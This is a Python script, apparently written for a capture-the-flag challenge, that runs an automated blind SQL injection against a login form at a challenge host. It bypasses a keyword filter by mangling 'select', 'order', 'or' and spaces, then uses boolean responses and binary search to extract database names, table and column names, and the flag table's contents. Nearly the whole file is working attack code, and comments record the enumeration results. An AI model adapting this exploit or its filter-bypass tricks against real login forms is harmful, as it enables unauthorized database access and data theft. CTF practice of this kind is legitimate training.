from requests import post
import logging

import mysql.connector

# cnx = mysql.connector.connect(user='root', password='password',
#                               host='127.0.0.1',
#                               database='Main')


logging.basicConfig(level=logging.INFO)

# Bypass WAF Keyword Filter
sk = {
    "select": "SELandECT",
    "order": "OwhereRDER",
    "or": "OwhereR",
    " ": "/**/"
}

# Blind SQL Let's GOOOOO!
TRUE_CONDITION = "Welcome!"
FALSE_CONDITION = "Incorrect username or password."

def binarySearch(checker, start, end, *argv):
    cur = int((start+end) / 2)

    while True:
        if checker(cur, *argv):
            start = cur+1
        else:
            end = cur

        if end-start == 1 or end == start:
            break

        cur = int((start+end) / 2)
        
    if end == start:
        return start
    elif end-start == 1:
        # Double Check
        flag = checker(start, *argv)

        if flag:
            return end
        else:
            return start
    else:
        logging.error("Something Went Wrong In Binary Search!!")


def incrementalSearch(checker, start, *argv):
    while True:
        if checker(start, *argv):
            start += 1
        else:
            break
    return start

# def send_request(sql:str):
#     sql = "select * from users where username=''" + sql
#     cursor = cnx.cursor()
#     cursor.execute(sql)

#     hasResult = False
#     for (result) in cursor:
#         hasResult = True

#     cursor.close()

#     if hasResult:
#         return TRUE_CONDITION
#     else:
#         return FALSE_CONDITION
    

def send_request(sql:str):

    # Preprocessing
    sql = sql.lower()
    logging.debug(sql)
    for key in sk:
        sql = sql.replace(key, sk[key])

    payload = {
        "username": f"\\'{sql};#",
        "password": ""
    }

    logging.debug(f"Sending Sql Payload of: {payload['username']}")

    response = post("https://sqli.chal.h4ck3r.quest/login", data=payload)
    if response.status_code == 500:
        logging.error("Something Went Wrong with Ur Payload!!")
        exit(1)
        return ""

    logging.debug(f"Got Response: {response.text}")
    return response.text

# UTIL Function - Check String Length
def check_len(length, target_sql):

    sql = f" or if (({target_sql}) > {length}, 1, 0)"
    res = send_request(sql)

    return TRUE_CONDITION in res

# Target_sql -> Prepare Target String Column
def check_ascii(target_ascii, target_sql, column_name, row_offset=0, character_offset=1):
    
    sql = f" or if ((select ASCII(SUBSTR({column_name}, {character_offset}, 1)) from ({target_sql}) as tabless limit {row_offset}, 1) > {target_ascii}, 1, 0)"
    res = send_request(sql)

    return TRUE_CONDITION in res

# Check DB Count
def get_db_count(length):
    # Construct Payload
    sql = "select count(*) from (select table_schema from information_schema.tables group by table_schema) as tabless"

    return check_len(length, sql)

# DB Name
def get_current_db_name():
    name = ""
    length = incrementalSearch(check_len, 0, "select length(database())")
    logging.info(f"Current DB name has length: {length}")

    for i in range(length):
        name += chr(binarySearch(check_ascii, 33, 126, "select database() as tstr", "tstr", 0, i+1))
        logging.info(f"Found {i}th character: {name[i]}")

    return name

def get_db_names(db_count):
    names = []
    for i in range(db_count):
        name = ""
        length = incrementalSearch(check_len, 0, f"select length(table_schema) from information_schema.tables group by table_schema order by length(table_schema) limit {i}, 1")
        logging.info(f"{i}th DB name has length: {length}")

        for j in range(length):
            name += chr(binarySearch(check_ascii, 33, 126, f"select table_schema from information_schema.tables group by table_schema order by length(table_schema)", "table_schema", i, j+1))
            logging.info(f"Found {j}th character: {name[j]}")

        logging.info(f"Append: {name}")
        names.append(name)
    
    return names

def get_all_table_name_in_db(index=0):
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(GROUP_CONCAT( distinct table_name)) from information_schema.columns group by table_schema order by table_schema limit {index}, 1")
    logging.info(f"Table Name of {index} name has length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select GROUP_CONCAT( distinct table_name) as tc from information_schema.columns group by table_schema order by table_schema limit {index}, 1", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result

def get_all_column_in_table(index=0):
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(group_concat(column_name)) from information_schema.columns group by table_schema order by length(table_schema) limit {index}, 1")
    logging.info(f"Column Concat Length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select group_concat(column_name) as tc from information_schema.columns group by table_schema order by length(table_schema) limit {index}, 1", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result

def get_all_content_in_rows():
    result = ""

    length = incrementalSearch(check_len, 0, f"select length(group_concat(i_4m_th3_fl4g)) from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`")
    logging.info(f"flag!!! length: {length}")

    for i in range(length):
        result += chr(binarySearch(check_ascii, 33, 126, f"select group_concat(i_4m_th3_fl4g) as tc from `h3y_here_15_the_flag_y0u_w4nt,meow,flag`", "tc", 0, i+1))
        logging.info(f"Found {i}th character: {result[i]}")

    return result


# Main Testing

# Has 5 DB
# print(incrementalSearch(get_db_count, 3))

# Current DB Name Has Length 2
# Current DB Name = db
# print(get_current_db_name())

# ['db', 'sys', 'mysql', 'information_schema']
# print(get_db_names(4))

# All Table in `db`
# [h3y_here_15_the_flag_y0u_w4nt,meow,flag,users]
# print(get_all_table_name_in_db(0))

# Get Table Column
# i_4m_th3_fl4g,password,uid,username
# print(get_all_column_in_table(0))
# guest,FLAG(is_in_another_table)

print(get_all_content_in_rows())

# cnx.close()
